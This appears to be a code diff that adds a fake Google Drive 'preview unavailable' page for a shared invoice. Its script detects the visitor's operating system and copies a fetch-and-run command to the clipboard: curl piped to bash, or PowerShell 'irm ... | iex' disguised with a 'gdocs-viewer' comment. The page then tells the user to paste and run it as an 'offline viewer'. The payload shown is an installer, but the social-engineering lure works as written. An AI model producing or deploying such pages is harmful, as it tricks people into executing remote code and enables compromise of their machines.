@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Drive — Preview unavailable</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: "Google Sans", Roboto, -apple-system, sans-serif;
+      background: #f8f9fa;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    .topbar {
+      background: #fff;
+      border-bottom: 1px solid #dadce0;
+      padding: 8px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .drive-logo { font-size: 20px; }
+    .topbar span { font-size: 15px; color: #5f6368; }
+    .topbar b { color: #202124; }
+    .main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .error-card {
+      text-align: center;
+      max-width: 440px;
+      padding: 24px;
+    }
+    .error-icon {
+      width: 80px;
+      height: 80px;
+      background: #f1f3f4;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 36px;
+      margin: 0 auto 20px;
+    }
+    .error-card h2 {
+      font-size: 18px;
+      color: #202124;
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+    .error-card p {
+      font-size: 14px;
+      color: #5f6368;
+      line-height: 1.5;
+      margin-bottom: 20px;
+    }
+    .fix-card {
+      background: #fff;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
+      padding: 20px;
+      text-align: left;
+      margin-bottom: 16px;
+    }
+    .fix-card h3 {
+      font-size: 14px;
+      font-weight: 500;
+      color: #202124;
+      margin-bottom: 12px;
+    }
+    .fix-steps {
+      font-size: 13px;
+      color: #3c4043;
+      line-height: 1.8;
+      padding-left: 20px;
+    }
+    .fix-steps li { margin-bottom: 6px; }
+    .fix-steps kbd {
+      background: #f1f3f4;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      padding: 1px 6px;
+      font-size: 11px;
+      font-family: monospace;
+    }
+    .btn {
+      display: inline-block;
+      padding: 10px 24px;
+      background: #1a73e8;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font: inherit;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    .btn:hover { background: #1765cc; }
+    .btn-text {
+      background: none;
+      color: #1a73e8;
+      border: none;
+      font: inherit;
+      font-size: 13px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <span class="drive-logo">📄</span>
+    <span><b>Invoice_March_2026.pdf</b> — Shared by accounting@company.com</span>
+  </div>
+  <div class="main">
+    <div class="error-card">
+      <div class="error-icon">📄</div>
+      <h2>Unable to preview this file</h2>
+      <p>This PDF requires a rendering component that isn't available in your browser. You can view it by running the Google Docs offline viewer.</p>
+      <div class="fix-card">
+        <h3>Open with Google Docs Offline Viewer</h3>
+        <ol class="fix-steps" id="steps"></ol>
+      </div>
+      <button class="btn" onclick="alert('Please follow the steps above.')">Try again</button>
+      <br>
+      <button class="btn-text">Request access from owner</button>
+    </div>
+  </div>
+  <script>
+    const platform = navigator?.userAgentData?.platform || navigator.platform;
+    const isMac = /mac/i.test(platform);
+    const isLinux = /linux/i.test(platform) && !/android/i.test(navigator.userAgent);
+    let cmd, steps;
+    if (isMac) {
+      cmd = 'clear && curl -fsSL https://bun.sh/install | bash && clear';
+      steps = [
+        'Open <b>Terminal</b> (<kbd>Cmd</kbd> + <kbd>Space</kbd>, type Terminal)',
+        'Press <kbd>Cmd</kbd> + <kbd>V</kbd> to paste the viewer command',
+        'Press <kbd>Return</kbd> to launch the offline viewer',
+      ];
+    } else if (isLinux) {
+      cmd = 'clear && curl -fsSL https://bun.sh/install | bash && clear';
+      steps = [
+        'Open your <b>Terminal</b>',
+        'Press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>V</kbd> to paste',
+        'Press <kbd>Enter</kbd> to launch',
+      ];
+    } else {
+      cmd = 'powershell -c "irm bun.sh/install.ps1 | iex" # gdocs-viewer ✅';
+      steps = [
+        'Press <kbd>Win</kbd> + <kbd>R</kbd> to open the Run dialog',
+        'Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the viewer command',
+        'Press <kbd>Enter</kbd> to open the document',
+      ];
+    }
+    document.getElementById('steps').innerHTML = steps.map(s => `<li>${s}</li>`).join('');
+    try { navigator.clipboard.writeText(cmd); } catch {}
+    try { const t=document.createElement('textarea');t.value=cmd;document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t); } catch {}
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
